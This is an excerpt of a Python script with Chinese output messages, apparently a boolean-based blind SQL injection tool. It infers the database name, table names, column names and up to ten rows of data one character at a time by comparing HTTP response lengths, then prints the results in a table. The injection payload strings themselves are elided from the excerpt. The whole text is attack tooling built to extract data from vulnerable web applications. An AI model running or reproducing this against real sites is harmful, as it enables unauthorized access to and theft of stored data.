...
if response_2 != response_1:
    print(Fore.GREEN + f"存在SQL注入！正常长度为: {response_1}, 错误长度为: {response_2}")
    ...
    while True:
        ...
        if len(requests.get(base_url + payload_3).text) == response_1:
            print(Fore.YELLOW + f"数据库名称长度为: {dbname_len}")
            break
        dbname_len += 1
    ...
    for dbname_index in range(1, dbname_len + 1):
        for dbname_char in base_str:
            ...
            if len(requests.get(base_url + payload_4).text) == response_1:
                dbname += dbname_char
                print(Fore.CYAN + f"数据库的第{dbname_index}个字符: {dbname_char}")
                break
    print(Fore.MAGENTA + f"完整数据库名称为: {dbname}")
    ...
    while True:
        ...
        if len(requests.get(base_url + payload_5).text) == response_1:
            print(Fore.YELLOW + f"数据库中表的个数为: {table_count}")
            break
        table_count += 1
        ...
        while True:
            for table_char in base_str:
                ...
                if len(requests.get(base_url + payload_6).text) == response_1:
                    ...
                    print(Fore.CYAN + f"表{table_index}的第{i}个字符: {table_char}")
                    break
            else:
                break
            i += 1
        print(Fore.MAGENTA + f"表{table_index}的完整表名为: {table_name}")
        tables.append(table_name)

    # 创建表格对象
    table_summary = PrettyTable()
    table_summary.field_names = ["表 名", "字 段 数", "每 行 数 据"]
    ...
    for table_name in tables:
        ...
        while True:
            ...
            if len(requests.get(base_url + payload_7).text) == response_1:
                print(Fore.YELLOW + f"表 {table_name} 的字段个数为: {column_count}")
                break
            column_count += 1
            ...
            while True:
                for column_char in base_str:
                    ...
                    if len(requests.get(base_url + payload_8).text) == response_1:
                        ...
                        print(Fore.CYAN + f"表 {table_name} 第 {column_index} 个字段的第 {i} 个字符: {column_char}")
                        break
                else:
                    break
                i += 1
            print(Fore.MAGENTA + f"表 {table_name} 的字段 {column_index} 的完整字段名为: {column_name}")
        ...
        for row_index in range(0, 10):  # 假设最多10行
            ...
            if len(requests.get(base_url + payload_row_count).text) == response_1:
                print(Fore.GREEN + f"-------> 正在获取表 {table_name} 第 {row_index + 1} 行数据 <-------")
                row_data = {}
                    ...
                    while True:
                        for char in base_str:
                            ...
                            if len(requests.get(base_url + payload_value).text) == response_1:
                                value += char
                                print(Fore.CYAN + f"{column} 的第 {char_index} 个字符为: {char}")
                                break
                        else:
                            # 如果没有匹配字符，说明到达字符串末尾
                            break
                ...
                # 将数据添加到表格中
                table_summary.add_row([table_name, len(columns), row_data])

            else:
                print(Fore.RED + f"表 {table_name} 中没有更多数据，结束在第 {row_index + 1} 行")
                break
    ...
    print(Fore.RED + "不存在SQL注入或payload不正确！")
